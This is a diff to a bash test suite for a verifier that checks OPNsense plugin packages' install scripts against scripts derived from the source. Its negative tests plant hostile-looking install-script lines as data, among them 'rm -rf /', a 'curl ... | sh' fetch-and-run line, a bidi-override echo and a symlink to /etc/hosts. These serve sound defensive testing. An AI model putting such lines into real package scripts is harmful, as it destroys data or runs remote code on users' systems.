@@ -500,6 +500,72 @@ expect_eq "writers: a build job step writing the summary is found" "$(writers "$
 export PATH="$root/tests/stub:$PATH" GH_REPO=Org/repo
 unset GITHUB_SHA
 sum() { sha256sum "$1" | awk '{print $1}'; }
+# Templates/ and Keywords/ of opnsense/plugins and LegoTypes/plugins master: the templates as they are there, and
+# keyword files shaped as there (a comment header, here a synthetic one) holding the flags and script bodies pkg
+# create reads
+updir="$T/upstream"
+mkdir -p "$updir/Templates" "$updir/Keywords"
+printf '%s\n' 'if [ -f /usr/local/etc/rc.d/configd ]; then /usr/local/etc/rc.d/configd restart; fi' >"$updir/Templates/actions.d"
+printf '%s\n' 'if [ -f /usr/local/etc/rc.configure_plugins ]; then echo "Reloading plugin configuration"; /usr/local/etc/rc.configure_plugins %%ARG%%; fi' \
+	>"$updir/Templates/configure"
+printf '%s\n' 'if [ -f /usr/local/opnsense/mvc/script/run_migrations.php ]; then /usr/local/opnsense/mvc/script/run_migrations.php %%ARG%%; fi' \
+	>"$updir/Templates/models"
+printf '%s\n' 'if [ -f /usr/local/etc/rc.configure_firmware ]; then echo "Reloading firmware configuration"; /usr/local/etc/rc.configure_firmware; fi' \
+	>"$updir/Templates/rc.loader.d"
+printf '%s\n' 'if [ -f /usr/local/sbin/configctl ]; then echo -n "Reloading template %%ARG%%: "; /usr/local/sbin/configctl template reload %%ARG%%; fi' \
+	>"$updir/Templates/templates"
+printf '{\n    "product_name": "%%%%PLUGIN_NAME%%%%"\n}\n' >"$updir/Templates/version"
+up_head='# MAINTAINER: maintainer@example.org
+#
+# @%s etc/somefile.conf.sample
+# (an illustrative header: master'"'"'s comments are not compared)
+
+actions: [file(1)]
+arguments: true
+post-install: <<EOD
+  case "%%1" in
+  /*) sample_file="%%1" ;;
+  *) sample_file="%%D/%%1" ;;
+  esac
+  target_file="${sample_file%%.sample}"
+  set -- %%@
+  if [ $# -eq 2 ]; then
+      target_file=${2}
+  fi
+  case "${target_file}" in
+  /*) target_file="${target_file}" ;;
+  *) target_file="%%D/${target_file}" ;;
+  esac
+  if ! [ -f "${target_file}" ]; then
+    /bin/cp -p "${sample_file}" "${target_file}"
+  fi
+EOD
+pre-deinstall: <<EOD
+  case "%%1" in
+  /*) sample_file="%%1" ;;
+  *) sample_file="%%D/%%1" ;;
+  esac
+  target_file="${sample_file%%.sample}"
+  set -- %%@
+  if [ $# -eq 2 ]; then
+      set -- %%@
+      target_file=${2}
+  fi
+  case "${target_file}" in
+  /*) target_file="${target_file}" ;;
+  *) target_file="%%D/${target_file}" ;;
+  esac
+'
+# shellcheck disable=SC2059 # the format is the fixture's own text
+{
+	printf "$up_head" sample
+	printf '%s\n' '  if cmp -s "${target_file}" "${sample_file}"; then' '    rm -f "${target_file}"' '  fi' EOD
+} >"$updir/Keywords/sample.ucl"
+# shellcheck disable=SC2059
+{
+	printf "$up_head" shadow
+	printf '%s\n' '  rm -f "${target_file}"' EOD
+} >"$updir/Keywords/shadow.ucl"
 reset_stub() {
 	export STUB="$T/stub"
 	rm -rf "$STUB"
@@ -1555,10 +1621,71 @@ vstage() {
 	printf '.Dd October 1, 2026\n.Nm alpha\n' | gzip -n >"$vu/man/man8/alpha.8.gz"
 	vver >"$vu/opnsense/version/alpha"
 }
-vbase='{"name":"os-alpha","origin":"opnsense/os-alpha","version":"1.0","comment":"Alpha",
- "maintainer":"maintainer@example.org","www":"https://example.org/alpha/","abi":"FreeBSD:15:amd64",
+# The install scripts S3 derives (spec -01 §3.5), written out by hand: the Templates/ lines plugins.mk's scripts
+# target appends, and the @sample and @shadow expansions pkg create appends, as os-legotypes 1.2's published
+# scripts show them (decoded: % where +MANIFEST holds %25; the plist path as @P@)
+t_actions='if [ -f /usr/local/etc/rc.d/configd ]; then /usr/local/etc/rc.d/configd restart; fi'
+t_loader='if [ -f /usr/local/etc/rc.configure_firmware ]; then echo "Reloading firmware configuration"; /usr/local/etc/rc.configure_firmware; fi'
+t_models() { printf 'if [ -f /usr/local/opnsense/mvc/script/run_migrations.php ]; then /usr/local/opnsense/mvc/script/run_migrations.php %s; fi' "$1"; }
+t_configure() { printf 'if [ -f /usr/local/etc/rc.configure_plugins ]; then echo "Reloading plugin configuration"; /usr/local/etc/rc.configure_plugins %s; fi' "$1"; }
+t_templates() { printf 'if [ -f /usr/local/sbin/configctl ]; then echo -n "Reloading template %s: "; /usr/local/sbin/configctl template reload %s; fi' "$1" "$1"; }
+x_head='# args: @P@
+  case "@P@" in
+  /*) sample_file="@P@" ;;
+  *) sample_file="/usr/local/@P@" ;;
+  esac
+  target_file="${sample_file%.sample}"
+  set -- @P@
+  if [ $# -eq 2 ]; then'
+x_tail='  case "${target_file}" in
+  /*) target_file="${target_file}" ;;
+  *) target_file="/usr/local/${target_file}" ;;
+  esac'
+# x_post <path>: the post-install expansion of "@sample <path>" or "@shadow <path>" (one text in both keywords);
+# sh_pre, sm_pre <path>: the pre-deinstall expansion of "@shadow <path>", of "@sample <path>"
+x_post() {
+	local t="$x_head
+      target_file=\${2}
+  fi
+$x_tail
+  if ! [ -f \"\${target_file}\" ]; then
+    /bin/cp -p \"\${sample_file}\" \"\${target_file}\"
+  fi"
+	printf '%s' "${t//@P@/"$1"}"
+}
+sh_pre() {
+	local t="$x_head
+      set -- @P@
+      target_file=\${2}
+  fi
+$x_tail
+  rm -f \"\${target_file}\""
+	printf '%s' "${t//@P@/"$1"}"
+}
+sm_pre() {
+	local t="$x_head
+      set -- @P@
+      target_file=\${2}
+  fi
+$x_tail
+  if cmp -s \"\${target_file}\" \"\${sample_file}\"; then
+    rm -f \"\${target_file}\"
+  fi"
+	printf '%s' "${t//@P@/"$1"}"
+}
+# sj <name>=<text>...: a +MANIFEST scripts object, each text url-encoded as pkg create writes it (% as %25)
+sj() {
+	local args=() kv
+	for kv in "$@"; do args+=(--arg "${kv%%=*}" "${kv#*=}"); done
+	jq -cn "${args[@]}" '$ARGS.named | map_values(gsub("%"; "%25"))'
+}
+# the two .shadow files of net/alpha below: what pkg create appends for them
+vA=/usr/local/etc/alpha.conf.sample vB=/usr/local/etc/pkg/repos/Alpha.conf.sample
+vscripts=$(sj "post-install=$(x_post $vA)"$'\n'"$(x_post $vB)" "pre-deinstall=$(sh_pre $vA)"$'\n'"$(sh_pre $vB)")
+vbase=$(jq -c --argjson s "$vscripts" '.scripts = $s' <<<'{"name":"os-alpha","origin":"opnsense/os-alpha","version":"1.0",
+ "comment":"Alpha","maintainer":"maintainer@example.org","www":"https://example.org/alpha/","abi":"FreeBSD:15:amd64",
  "arch":"freebsd:15:x86:64","prefix":"/usr/local","flatsize":1,"licenselogic":"single","licenses":["BSD2CLAUSE"],
- "desc":"Alpha","categories":["net"],"scripts":{"pre-deinstall":"echo bye","post-install":"echo installed\nexit 0"}}'
+ "desc":"Alpha","categories":["net"]}')
 # vpkg [<jq arguments and filter>]: $vp/alpha.pkg from the stage, as pkg create writes one: zstd, absolute member
 # names (relative with VPKG_REL=1), owner VPKG_OWNER (default root:wheel); +MANIFEST lists each staged
 # file (1$ sha256, mode, owner) and annotates the version file, then the filter applies;
@@ -1620,9 +1747,16 @@ vreset() { vsrc && vstage && vpkg; }
 volt=/usr/local/opnsense/mvc/app/views/Alpha/index.volt
 runpy=/usr/local/opnsense/scripts/Alpha/run.py
 
+tabbed() { sed $'s/^/\t/' <<<"$1"; }
 vreset
-expect_eq "payload: identical, with .in, .shadow, .shadow.in and man/" "$(vrun 2>&1; echo "rc=$?")" \
-	$'payload: OK (8 files)\nscript post-install:\n\techo installed\n\texit 0\nscript pre-deinstall:\n\techo bye\nrc=0'
+expect_eq "payload: identical, with .in, .shadow, .shadow.in and man/, the scripts derived and shown decoded" \
+	"$(vrun 2>&1; echo "rc=$?")" "payload: OK (8 files)
+scripts: derived from the source, identical (2)
+script post-install:
+$(tabbed "$(x_post $vA)"$'\n'"$(x_post $vB)")
+script pre-deinstall:
+$(tabbed "$(sh_pre $vA)"$'\n'"$(sh_pre $vB)")
+rc=0"
 VPKG_REL=1 vpkg
 vpass "payload: relative member names"
 vreset
@@ -1865,8 +1999,13 @@ vpkg '.scripts["post-install"] = "echo ‮evil"'
 vfail "payload: a script with a bidi override" "script post-install holds characters other than printable ASCII, tab and newline"
 vpkg '.scripts["post-install"] = "echo %72m"'
 vfail "payload: a %-escape pkg would decode" "script post-install holds a %-escape other than %25, which pkg would decode"
-vpkg '.scripts = {"post-install": "echo 100%25"}'
-expect_eq "payload: a script is shown as pkg decodes it" "$(vrun 2>&1 | tail -2)" $'script post-install:\n\techo 100%'
+vpkg
+vpkg '.scripts["pre-deinstall"] |= gsub("%25"; "%")'
+vfail "payload: a script holding a % pkg create would have written as %25" \
+	"script pre-deinstall holds a %-escape other than %25, which pkg would decode"
+vpkg
+expect_eq "payload: a script is shown as pkg decodes it" \
+	"$(vrun 2>&1 | grep -cxF $'\t  target_file="${sample_file%.sample}"')" 4
 
 # member types and flags, from libarchive's own view
 vreset
@@ -2046,6 +2185,210 @@ vreset
 expect_fail "payload: a commit that is not 40 hex digits" bash "$root/scripts/verify-payload.sh" "$vp/alpha.pkg" "$vp/net/alpha" os-alpha 1.0 FreeBSD:15:amd64 26.7 "$vhash"
 expect_fail "payload: usage" bash "$root/scripts/verify-payload.sh" "$vp/alpha.pkg"
 expect_fail "payload: not a package" bash "$root/scripts/verify-payload.sh" "$T/repo.conf" "$vp/net/alpha" os-alpha 1.0 FreeBSD:15:amd64 26.7 "$commit"
+
+# --- verify-payload.sh: the install scripts, derived from the source (S3, spec -01 §3.5) -------------
+# vadd <path> [<line>]: a source file under src/ and the same file staged, as install copies it
+vadd() {
+	mkdir -p "$(dirname "$vs/$1")" "$(dirname "$vu/$1")"
+	printf '%s\n' "${2:-x}" >"$vs/$1"
+	printf '%s\n' "${2:-x}" >"$vu/$1"
+}
+# vscr <name>=<text>...: the package from the stage, with exactly those scripts
+vscr() { vpkg --argjson s "$(sj "$@")" '.scripts = $s'; }
+vreset
+vscr "post-install=$(x_post $vB)"$'\n'"$(x_post $vA)" "pre-deinstall=$(sh_pre $vB)"$'\n'"$(sh_pre $vA)"
+vpass "scripts: two .shadow expansions in the other order"
+vreset
+vpkg '.scripts["post-install"] += "\nrm -rf /"'
+vfail "scripts: one extra line" 'script post-install: line 35 is "rm -rf /", derived nothing more'
+vpkg '.scripts["post-install"] += "; rm -rf /"'
+vfail "scripts: text added to the last line" 'script post-install: line 34 is "  fi; rm -rf /", derived "  fi"'
+vpkg '.scripts["post-install"] |= sub("cp -p"; "cp -f")'
+vfail "scripts: one changed character" \
+	'script post-install: line 16 is "    /bin/cp -f "${sample_file}" "${target_file}"", derived "    /bin/cp -p "${sample_file}" "${target_file}""'
+vpkg 'del(.scripts["pre-deinstall"])'
+vfail "scripts: a missing script" "script pre-deinstall: not in the package, though the source derives one"
+vpkg '.scripts.install = "echo x"'
+vfail "scripts: an extra script name" "script install: in the package, though the source derives none"
+vpkg '.scripts["post-deinstall"] = "echo x"'
+vfail "scripts: a script where none is derived" "script post-deinstall: in the package, though the source derives none"
+vpkg 'del(.scripts)'
+vfail "scripts: no scripts at all" "script post-install: not in the package, though the source derives one"
+vscr "post-install=$(x_post $vA)"$'\n'"$(x_post $vB)"$'\n'"$(x_post $vA)" "pre-deinstall=$(sh_pre $vA)"$'\n'"$(sh_pre $vB)"
+vfail "scripts: a duplicated keyword expansion" 'script post-install: line 35 is "# args: /usr/local/etc/alpha.conf.sample", derived nothing more'
+vscr "post-install=$(x_post $vA)" "pre-deinstall=$(sh_pre $vA)"$'\n'"$(sh_pre $vB)"
+vfail "scripts: a keyword expansion left out" 'script post-install: line 18 is missing, derived "# args: /usr/local/etc/pkg/repos/Alpha.conf.sample"'
+vscr "post-install=$(x_post $vA)"$'\n'"$(sh_pre $vB)" "pre-deinstall=$(sh_pre $vA)"$'\n'"$(sh_pre $vB)"
+vfail "scripts: another keyword's expansion" \
+	'script post-install: line 26 is "      set -- /usr/local/etc/pkg/repos/Alpha.conf.sample", derived "      target_file=${2}"'
+vpkg '.scripts["post-install"] += "\n"'
+vfail "scripts: a last newline pkg create trims" 'script post-install: line 35 is "", derived nothing more'
+vpkg '.scripts["pre-deinstall"] = "\n" + .scripts["pre-deinstall"]'
+vfail "scripts: a first blank line pkg create trims" \
+	'script pre-deinstall: line 1 is "", derived "# args: /usr/local/etc/alpha.conf.sample"'
+
+# every scripts-auto rule (plugins.mk:178-223), in plugins.mk's order; find -s order is each directory's entries
+# sorted, a directory's own entries right after it (start/a/c.start before start/a.b.start, OPNsense/Alpha
+# before OPNsense.Old/Beta), and only depth-2 directories name models and templates
+vreset
+for f in etc/rc.syshook.d/start/a.b.start etc/rc.syshook.d/start/a/c.start etc/rc.syshook.d/early/50-alpha.early \
+	etc/rc.syshook.d/start/README opnsense/service/conf/actions.d/actions_alpha.conf etc/rc.loader.d/20-alpha \
+	opnsense/mvc/app/models/OPNsense.Old/Beta/Beta.xml opnsense/mvc/app/models/OPNsense/Alpha/Alpha.xml \
+	opnsense/mvc/app/models/OPNsense/Alpha/Menu/Menu.xml opnsense/mvc/app/models/OPNsense/top.php \
+	opnsense/service/templates/OPNsense/Alpha/+TARGETS opnsense/scripts/firmware/repos/Alpha.php; do
+	vadd "$f"
+done
+hooks="/usr/local/etc/rc.syshook.d/early/50-alpha.early
+/usr/local/etc/rc.syshook.d/start/a/c.start
+/usr/local/etc/rc.syshook.d/start/a.b.start"
+rest="$t_actions
+$t_loader
+$(t_models OPNsense/Alpha)
+$(t_models OPNsense.Old/Beta)
+$(t_configure POST_INSTALL)
+$(t_templates OPNsense/Alpha)
+/usr/local/opnsense/scripts/firmware/repos/Alpha.php"
+auto="$hooks"$'\n'"$rest"
+vscr "post-install=$auto"$'\n'"$(x_post $vA)"$'\n'"$(x_post $vB)" "pre-deinstall=$(sh_pre $vA)"$'\n'"$(sh_pre $vB)" \
+	"post-deinstall=$t_loader"$'\n'"$(t_configure POST_DEINSTALL)"
+vpass "scripts: every scripts-auto rule, then the keyword expansions"
+expect_eq "scripts: the count of scripts" "$(vrun 2>/dev/null | sed -n 2p)" "scripts: derived from the source, identical (3)"
+sorted=$(LC_ALL=C sort <<<"$hooks")
+vscr "post-install=$sorted"$'\n'"$rest"$'\n'"$(x_post $vA)"$'\n'"$(x_post $vB)" \
+	"pre-deinstall=$(sh_pre $vA)"$'\n'"$(sh_pre $vB)" "post-deinstall=$t_loader"$'\n'"$(t_configure POST_DEINSTALL)"
+vfail "scripts: the file part's order is fixed" \
+	'script post-install: line 2 is "/usr/local/etc/rc.syshook.d/start/a.b.start", derived "/usr/local/etc/rc.syshook.d/start/a/c.start"'
+vscr "post-install=$(x_post $vA)"$'\n'"$auto"$'\n'"$(x_post $vB)" "pre-deinstall=$(sh_pre $vA)"$'\n'"$(sh_pre $vB)" \
+	"post-deinstall=$t_loader"$'\n'"$(t_configure POST_DEINSTALL)"
+vfail "scripts: the keyword expansions come after the file part" \
+	'script post-install: line 1 is "# args: /usr/local/etc/alpha.conf.sample", derived "/usr/local/etc/rc.syshook.d/early/50-alpha.early"'
+
+# .pre, .post and a manual script, sed-substituted (defaults.mk SED_REPLACE); a manual script replaces
+# what .pre, the auto rules and .post would make; pkg create trims the blank first line of a .post
+vreset
+printf 'echo %%%%PLUGIN_NAME%%%% %%%%PLUGIN_PKGVERSION%%%%\n' >"$vp/net/alpha/+PRE_INSTALL.pre"
+printf '\necho done %%%%PLUGIN_HASH%%%% 100%%\n' >"$vp/net/alpha/+POST_INSTALL.post"
+printf 'ignored\n' >"$vp/net/alpha/+PRE_DEINSTALL.pre"
+printf 'echo manual %%%%PLUGIN_PKGNAME%%%% %%%%PLUGIN_UNKNOWN%%%%\n' >"$vp/net/alpha/+PRE_DEINSTALL"
+vscr "pre-install=echo alpha 1.0" "post-install=echo done $vhash 100%"$'\n'"$(x_post $vA)"$'\n'"$(x_post $vB)" \
+	"pre-deinstall=echo manual os-alpha %%PLUGIN_UNKNOWN%%"$'\n'"$(sh_pre $vA)"$'\n'"$(sh_pre $vB)"
+vpass "scripts: .pre, .post and a manual script, substituted"
+vscr "pre-install=echo alpha 1.0" "post-install=echo done $vhash 100%"$'\n'"$(x_post $vA)"$'\n'"$(x_post $vB)" \
+	"pre-deinstall=ignored"$'\n'"echo manual os-alpha %%PLUGIN_UNKNOWN%%"$'\n'"$(sh_pre $vA)"$'\n'"$(sh_pre $vB)"
+vfail "scripts: a manual script is the whole file part" \
+	'script pre-deinstall: line 1 is "ignored", derived "echo manual os-alpha %%PLUGIN_UNKNOWN%%"'
+# an empty script: what pkg create stores for one is not modelled, so a source that derives one is refused
+: >"$vp/net/alpha/+POST_DEINSTALL.pre"
+vscr "pre-install=echo alpha 1.0" "post-install=echo done $vhash 100%"$'\n'"$(x_post $vA)"$'\n'"$(x_post $vB)" \
+	"pre-deinstall=echo manual os-alpha %%PLUGIN_UNKNOWN%%"$'\n'"$(sh_pre $vA)"$'\n'"$(sh_pre $vB)" "post-deinstall="
+vfail "scripts: an empty source" \
+	"script post-deinstall: derived empty, which is not supported (pkg's handling of an empty script is not modelled)"
+vscr "pre-install=echo alpha 1.0" "post-install=echo done $vhash 100%"$'\n'"$(x_post $vA)"$'\n'"$(x_post $vB)" \
+	"pre-deinstall=echo manual os-alpha %%PLUGIN_UNKNOWN%%"$'\n'"$(sh_pre $vA)"$'\n'"$(sh_pre $vB)"
+vfail "scripts: an empty source, the package without the script" \
+	"script post-deinstall: derived empty, which is not supported (pkg's handling of an empty script is not modelled)"
+printf '\n \n\t\n' >"$vp/net/alpha/+POST_DEINSTALL.pre"
+vfail "scripts: a source of blank lines" \
+	"script post-deinstall: derived empty, which is not supported (pkg's handling of an empty script is not modelled)"
+# a .sample file: @sample, whose post-install text is @shadow's and whose pre-deinstall keeps a changed file
+vreset
+vadd etc/beta.conf.sample
+vB0=/usr/local/etc/beta.conf.sample
+vscr "post-install=$(x_post $vA)"$'\n'"$(x_post $vB0)"$'\n'"$(x_post $vB)" \
+	"pre-deinstall=$(sm_pre $vB0)"$'\n'"$(sh_pre $vA)"$'\n'"$(sh_pre $vB)"
+vpass "scripts: a .sample and two .shadow files"
+vscr "post-install=$(x_post $vA)"$'\n'"$(x_post $vB0)"$'\n'"$(x_post $vB)" \
+	"pre-deinstall=$(sh_pre $vB0)"$'\n'"$(sh_pre $vA)"$'\n'"$(sh_pre $vB)"
+vfail "scripts: a .sample expanded as @shadow" \
+	'script pre-deinstall: line 16 is "  rm -f "${target_file}"", derived "  if cmp -s "${target_file}" "${sample_file}"; then"'
+
+# the templates and keywords are verify-payload.sh's copies, never the tree's: a tree whose Templates/ and
+# Keywords/ differ changes nothing, and a package built with them is refused
+vreset
+mkdir -p "$vp/Templates" "$vp/Keywords"
+printf 'curl -s https://example.org/x | sh\n' >"$vp/Templates/actions.d"
+printf 'post-install: <<EOD\ncurl -s https://example.org/x | sh\nEOD\n' >"$vp/Keywords/shadow.ucl"
+vpass "scripts: the tree's own Templates/ and Keywords/ are never read"
+vscr "post-install=curl -s https://example.org/x | sh"$'\n'"curl -s https://example.org/x | sh" "pre-deinstall=$(sh_pre $vA)"$'\n'"$(sh_pre $vB)"
+vfail "scripts: a package built with another tree's keywords" \
+	'script post-install: line 1 is "curl -s https://example.org/x | sh", derived "# args: /usr/local/etc/alpha.conf.sample"'
+rm -rf "$vp/Templates" "$vp/Keywords"
+
+# what is not modelled is refused
+vreset
+printf 'echo x\n' >"$vp/net/alpha/+INSTALL"
+vfail "scripts: +INSTALL" "+INSTALL: not an install script source plugins.mk reads (+PRE_INSTALL, +POST_INSTALL, +PRE_DEINSTALL or +POST_DEINSTALL, each alone or as .pre or .post), which is not supported"
+rm "$vp/net/alpha/+INSTALL"
+printf 'echo x\n' >"$vp/net/alpha/+POST_INSTALL.orig"
+vfail "scripts: another + file" "+POST_INSTALL.orig: not an install script source plugins.mk reads (+PRE_INSTALL, +POST_INSTALL, +PRE_DEINSTALL or +POST_DEINSTALL, each alone or as .pre or .post), which is not supported"
+rm "$vp/net/alpha/+POST_INSTALL.orig"
+ln -s ../../../etc/hosts "$vp/net/alpha/+POST_INSTALL"
+vfail "scripts: a script source that is a symbolic link" "+POST_INSTALL: not a regular file, which is not supported"
+rm "$vp/net/alpha/+POST_INSTALL"
+mkdir "$vp/net/alpha/+POST_INSTALL.pre"
+vfail "scripts: a script source that is a directory" "+POST_INSTALL.pre: not a regular file, which is not supported"
+rmdir "$vp/net/alpha/+POST_INSTALL.pre"
+printf 'echo x\r\n' >"$vp/net/alpha/+POST_INSTALL.post"
+vfail "scripts: a script source with CR" "+POST_INSTALL.post: not printable ASCII text, tab and newline, which is not supported"
+printf 'echo \303\251\n' >"$vp/net/alpha/+POST_INSTALL.post"
+vfail "scripts: a script source beyond ASCII" "+POST_INSTALL.post: not printable ASCII text, tab and newline, which is not supported"
+printf 'echo x' >"$vp/net/alpha/+POST_INSTALL.post"
+vfail "scripts: a script source whose last line has no newline" "+POST_INSTALL.post: its last line has no newline, which is not supported"
+printf 'echo a\000b\n' >"$vp/net/alpha/+POST_INSTALL.post"
+vfail "scripts: a script source with NUL" "+POST_INSTALL.post: not printable ASCII text, tab and newline, which is not supported"
+rm "$vp/net/alpha/+POST_INSTALL.post"
+mkdir -p "$vs/opnsense/mvc/app/models/OPNsense/Bad Dir"
+ln -s ../Alpha "$vs/opnsense/mvc/app/models/OPNsense/Bad Dir/link"
+vfail "scripts: a models directory named outside the plain set" "src/opnsense/mvc/app/models/OPNsense/Bad Dir: unsupported directory name"
+vreset
+mkdir -p "$vs/opnsense/service/templates/OPNsense/Bad Dir"
+ln -s ../Alpha "$vs/opnsense/service/templates/OPNsense/Bad Dir/link"
+vfail "scripts: a templates directory named outside the plain set" "src/opnsense/service/templates/OPNsense/Bad Dir: unsupported directory name"
+vreset
+vadd "etc/rc.syshook.d/start/50 alpha.start"
+vfail "scripts: a hook named outside the plain set" "src/etc/rc.syshook.d/start/50 alpha.start: unsupported file name"
+
+# the copies: each template is opnsense/plugins master's file, byte for byte (git blob ids at opnsense/plugins
+# e4578ae and LegoTypes/plugins 3afd667, which agree); each keyword copy holds only the flags and script bodies,
+# and reads (--model) as the master-shaped fixture does, its comment header aside
+vpl() { bash "$root/scripts/verify-payload.sh" "$@"; }
+expect_eq "copied: the files verify-payload.sh holds copies of" "$(vpl --copied | tr '\n' ' ')" \
+	"Templates/actions.d Templates/configure Templates/models Templates/rc.loader.d Templates/templates Keywords/sample.ucl Keywords/shadow.ucl "
+for c in Templates/actions.d:c5e1385c90322d621e271113f08f7ccbf3d83edf Templates/configure:c95feae6aa493038f4dd660633632a545849d8a4 \
+	Templates/models:9ccf0beb9ec0872ba40f99db87668955cf53e7ed Templates/rc.loader.d:617b2e279083b000411790492fd401cc9006664e \
+	Templates/templates:626f1c9e4aa2e723a7a83179b513b9e7520fe65a; do
+	expect_eq "copied: ${c%%:*} is opnsense/plugins master's" "$(vpl --copied "${c%%:*}" | git hash-object --stdin)" "${c#*:}"
+	expect_eq "copied: ${c%%:*} is the fixture's" "$(vpl --copied "${c%%:*}" | cmp -s - "$updir/${c%%:*}"; echo $?)" 0
+done
+for k in sample shadow; do
+	vpl --copied "Keywords/$k.ucl" >"$T/copy.ucl"
+	expect_eq "copied: Keywords/$k.ucl holds no comment and no blank line" "$(grep -c -e '^#' -e '^$' "$T/copy.ucl")" 0
+	expect_eq "model: the copy of Keywords/$k.ucl reads as master's file, comments aside" \
+		"$(vpl --model "$T/copy.ucl")" "$(vpl --model "$updir/Keywords/$k.ucl")"
+done
+expect_eq "model: the flags and each script's body" \
+	"$(vpl --model "$updir/Keywords/shadow.ucl" | jq -r '[.actions[0], .arguments, (.scripts | keys | join(" ")), (.scripts["pre-deinstall"] | split("\n") | last)] | join("|")')" \
+	'file(1)|true|post-install pre-deinstall|  rm -f "${target_file}"'
+{ cat "$updir/Keywords/shadow.ucl"; printf 'messages: [{message: "x"}]\n'; } >"$T/model.ucl"
+expect_eq "model: a key it does not model" "$(vpl --model "$T/model.ucl" 2>&1 >/dev/null; echo "rc=$?")" \
+	"verify-payload.sh: $T/model.ucl: a line other than a comment, the two flags and the script bodies is not modelled
+rc=1"
+grep -v '^arguments: true$' "$updir/Keywords/shadow.ucl" >"$T/model.ucl"
+expect_eq "model: without arguments: true" "$(vpl --model "$T/model.ucl" 2>&1 >/dev/null)" \
+	"verify-payload.sh: $T/model.ucl: not both actions: [file(1)] and arguments: true, which is not modelled"
+sed '$d' "$updir/Keywords/shadow.ucl" >"$T/model.ucl"
+expect_eq "model: a body without its end" "$(vpl --model "$T/model.ucl" 2>&1 >/dev/null)" \
+	"verify-payload.sh: $T/model.ucl: pre-deinstall's body has no end"
+{ cat "$updir/Keywords/shadow.ucl"; printf 'pre-deinstall: <<EOD\n  true\nEOD\n'; } >"$T/model.ucl"
+expect_eq "model: a script repeated" "$(vpl --model "$T/model.ucl" 2>&1 >/dev/null)" \
+	"verify-payload.sh: $T/model.ucl: pre-deinstall is repeated"
+sed 's/cp -p/cp -f/' "$updir/Keywords/shadow.ucl" >"$T/model.ucl"
+expect_eq "model: a changed body reads otherwise" \
+	"$( [[ $(vpl --model "$T/model.ucl") == "$(vpl --model "$updir/Keywords/shadow.ucl")" ]] && echo same || echo differs)" differs
+expect_fail "model: usage" vpl --model
+expect_fail "model: no such file" vpl --model "$T/nothing.ucl"
+expect_fail "copied: a file it holds no copy of" bash "$root/scripts/verify-payload.sh" --copied Templates/version
+expect_fail "copied: usage" bash "$root/scripts/verify-payload.sh" --copied Templates/actions.d x
 
 # --- canary-findings.sh and canary-report.sh ----------------------------------------
 fd() { bash "$root/scripts/canary-findings.sh" os-alpha "$T/cf"; echo "rc=$?"; }
@@ -2624,8 +2967,11 @@ reset_stub
 so="$T/so" sr="$T/sr"
 # soset [<vpkg filter>]: $so, a build of net/alpha as the review job downloads it (its source and
 # build lines the VM's own), and $sr, the review job's source, build and manifest
+# (with SMANUAL, net/alpha has that manual +POST_INSTALL)
 soset() {
-	vsrc && vstage && vpkg "$@"
+	vsrc || return
+	[[ -z ${SMANUAL:-} ]] || printf '%s\n' "$SMANUAL" >"$vp/net/alpha/+POST_INSTALL"
+	vstage && vpkg "$@"
 	rm -rf "$so" "$sr" && mkdir -p "$so" "$sr"
 	cp "$vp/alpha.pkg" "$so/os-alpha-1.0.pkg"
 	printf 'Built from the VM, which no one reads.\n' >"$so/source"
@@ -2638,8 +2984,10 @@ smr() {
 	COMMIT="${SCOMMIT-$commit}" PLUGIN_DIR="$vp/net/alpha" \
 		bash "$S/summary.sh" os-alpha "$so" "$sr"
 }
-# the post-install script holds backtick runs, one a line of its own, and a marker for "package text"
-soset '.scripts["post-install"] = "echo ``` and ```` PKGTEXT\n````\nexit 0"'
+# a manual post-install script holds backtick runs, one a line of its own, and a marker for "package text"
+smanual=$'echo ``` and ```` PKGTEXT\n````\nexit 0'
+sscripts=$(sj "post-install=$smanual"$'\n'"$(x_post $vA)"$'\n'"$(x_post $vB)" "pre-deinstall=$(sh_pre $vA)"$'\n'"$(sh_pre $vB)")
+SMANUAL=$smanual soset --argjson s "$sscripts" '.scripts = $s'
 s=$(smr 2>/dev/null) || bad "summary: exited non-zero"
 o=$(outside <<<"$s")
 expect_eq "summary: it opens by saying it is the one summary to read" "$(head -n 1 <<<"$s")" \
@@ -2648,6 +2996,11 @@ expect_eq "summary: every fence closes" "$(grep -c UNCLOSED <<<"$o")" 0
 expect_eq "summary: no package text outside a fence" \
 	"$(grep -cE 'PKGTEXT|payload:|script |product_|/usr/local|abi:|Built from|built os-alpha|```' <<<"$o")" 0
 expect_eq "summary: the payload passes" "$(grep -c '^### Payload check: passed$' <<<"$o")" 1
+expect_eq "summary: the verdict, in a fence" \
+	"$(grep -cxF 'payload: OK (8 files)' <<<"$s") $(grep -cxF 'scripts: derived from the source, identical (2)' <<<"$s")" "1 1"
+expect_eq "summary: the scripts collapsed, as reference that needs no review" \
+	"$(grep -cxF '<details><summary>The install scripts as pkg will run them, for reference only: derived from the source and identical, nothing in them to review</summary>' <<<"$o") $(grep -cx '</details>' <<<"$o")" "1 1"
+expect_eq "summary: the approver is not asked to read the scripts" "$(grep -ciE 'read (the|its) install scripts|install scripts, as pkg will run them:' <<<"$o")" 0
 expect_eq "summary: the decoded scripts, verbatim" "$(grep -cxF "$(printf '\techo ``` and ```` PKGTEXT')" <<<"$s")" 1
 expect_eq "summary: a fence longer than the longest backtick run inside" "$(grep -cx '`````' <<<"$s")" 2
 expect_eq "summary: the commit, outside a fence" "$(grep -c "\`$commit\`" <<<"$o")" 1
@@ -2662,7 +3015,7 @@ expect_eq "summary: the first release" "$(grep -c '^No earlier release of os-alp
 vpkg
 publish os-alpha-0.9 2026-01-01T00:00:00Z
 cp "$vp/alpha.pkg" "$STUB/assets/os-alpha-0.9/os-alpha-0.9.pkg"
-soset '.scripts["post-install"] = "echo ``` and ```` PKGTEXT\n````\nexit 0"'
+SMANUAL=$smanual soset --argjson s "$sscripts" '.scripts = $s'
 s=$(smr 2>/dev/null) || bad "summary with a release: exited non-zero"
 o=$(outside <<<"$s")
 expect_eq "summary: compared with the newest release" "$(grep -c '^Material differences from the newest release:$' <<<"$o")" 1
@@ -2704,6 +3057,22 @@ expect_fail "summary: no manifest from the review job" smr
 soset && rm "$sr/source"
 expect_fail "summary: no source line from the review job" smr
 expect_fail "summary: usage" bash "$root/scripts/summary.sh" os-alpha "$so"
+
+# --- no e-mail address ----------------------------------------------------------------------------
+# no tracked file holds an e-mail address but in a documentation domain (example.org, .com and .net, and the
+# .example, .test and .invalid names) or the owner's GitHub no-reply address (vendor/legotypes's maintainer)
+addresses() {
